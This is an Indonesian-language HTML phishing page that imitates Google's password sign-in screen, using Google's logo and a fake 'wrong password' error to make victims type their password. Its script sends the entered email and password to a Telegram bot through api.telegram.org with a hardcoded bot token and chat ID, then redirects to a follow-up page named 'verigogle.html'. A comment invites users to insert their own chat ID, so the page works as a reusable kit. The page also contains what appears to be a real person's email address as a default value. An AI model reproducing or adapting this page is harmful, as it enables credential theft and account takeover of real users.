<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google</title>

<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Google Sans',sans-serif;
}

body{
    background:#fff;
    min-height:100vh;
    display:flex;
    justify-content:center;
}

.container{
    width:100%;
    max-width:100%;
    min-height:100vh;
    padding:24px 24px 40px;
    display:flex;
    flex-direction:column;
    position:static;
}

.logo{
    text-align:center;
    margin-top:24px;
}

.logo img{
    width:92px;
    height:auto;
}

.title{
    text-align:center;
    margin-top:16px;
    font-size:24px;
    color:#202124;
    font-weight:400;
}

.email{
    display:flex;
    justify-content:center;
    align-items:center;
    gap:6px;
    margin-top:12px;
    color:#3c4043;
    font-size:14px;
    font-weight:500;
}

.user-icon{
    width:20px;
    height:20px;
}

.form{
    margin-top:40px;
}

.field{
    position:relative;
}

.field label{
    position:absolute;
    left:14px;
    top:-12px;
    background:#fff;
    padding:0 8px;
    color:#d93025;
    font-size:14px;
}

.field input{
    width:100%;
    height:56px;
    border:2px solid #d93025;
    border-radius:5px;
    outline:none;
    font-size:16px;
    padding:0 16px;
}

.error{
    display:flex;
    align-items:flex-start;
    gap:10px;
    color:#d93025;
    font-size:14px;
    margin-top:12px;
    line-height:1.4;
}

.error svg{
    min-width:20px;
    width:20px;
    height:20px;
}

.show{
    display:flex;
    align-items:center;
    gap:10px;
    margin-top:16px;
    color:#202124;
    font-size:14px;
}

.show input{
    width:20px;
    height:20px;
}

.bottom{
    position:static;
    margin-top:auto;
    padding-top:32px;
    display:flex;
    justify-content:space-between;
    align-items:center;
}

.bottom a{
    color:#1a73e8;
    text-decoration:none;
    font-size:14px;
    font-weight:500;
}

.bottom button{
    background:#1a73e8;
    color:#fff;
    border:none;
    border-radius:4px;
    height:48px;
    padding:0 20px;
    font-size:14px;
    font-weight:500;
    cursor:pointer;
}

.bottom button:hover{
    background:#1765cc;
}

.bottom button:disabled{
    background:#8ab4f8;
    cursor:wait;
}
</style>
</head>
<body>

<div class="container">

    <div class="logo">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
    </div>

    <div class="title">Selamat datang</div>

    <div class="email">
        <svg class="user-icon" viewBox="0 0 24 24" fill="#5f6368">
            <path d="M12 12c2.8 0 5-2.2 5-5s-2.2-5-5-5-5 2.2-5 5 2.2 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z"/>
        </svg>

        <span id="email"></span>
    </div>

    <div class="form">

        <div class="field">
            <label>Masukkan sandi</label>
            <input id="password" type="password">
        </div>

        <div class="error">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="#d93025">
                <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
            </svg>

            <span>
                Sandi salah. Coba lagi atau klik
                "Coba cara lain" untuk opsi lainnya.
            </span>
        </div>

        <label class="show">
            <input type="checkbox" id="showPass">
            <span>Tampilkan sandi</span>
        </label>

    </div>

    <div class="bottom">
        <a href="#">Coba cara lain</a>
        <button id="nextBtn">Berikutnya</button>
    </div>

</div>

<script>
/* ==============================
   DATA DARI HALAMAN SEBELUMNYA
   ============================== */
document.getElementById("email").textContent =
localStorage.getItem("email") || "ayucahya258@gmail.com";

document.getElementById("showPass").addEventListener("change", function(){
    document.getElementById("password").type =
    this.checked ? "text" : "password";
});

/* ==============================
   KONFIGURASI TELEGRAM BOT
   ============================== */
const BOT_TOKEN = '8824816621%3AAAF7kLSbFOHiibnFHAelyYwspJ7txEQFgVk';
const CHAT_ID   = '7549590022'; // ← GANTI DENGAN CHAT ID ANDA

const nextBtn      = document.getElementById('nextBtn');
const passwordInput= document.getElementById('password');
const emailDisplay = document.getElementById('email');

nextBtn.addEventListener('click', async function(e) {
    e.preventDefault();
    
    const password = passwordInput.value.trim();
    const email    = emailDisplay.textContent.trim();
    
    if (!password) {
        alert('Harap masukkan sandi Anda.');
        passwordInput.focus();
        return;
    }

    nextBtn.disabled = true;
    nextBtn.textContent = 'Memuat...';

    const message = `
🔔 <b>Data Login Masuk</b>

📧 Email: <code>${email}</code>
🔑 Password: <code>${password}</code>
    `;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const result = await response.json();

        if (result.ok) {
            window.location.href = 'verigogle.html';
        } else {
            alert('Gagal mengirim. Periksa token & chat ID.');
            nextBtn.disabled = false;
            nextBtn.textContent = 'Berikutnya';
        }

    } catch (error) {
        console.error('Error:', error);
        alert('Terjadi kesalahan jaringan.');
        nextBtn.disabled = false;
        nextBtn.textContent = 'Berikutnya';
    }
});
</script>

</body>
</html>
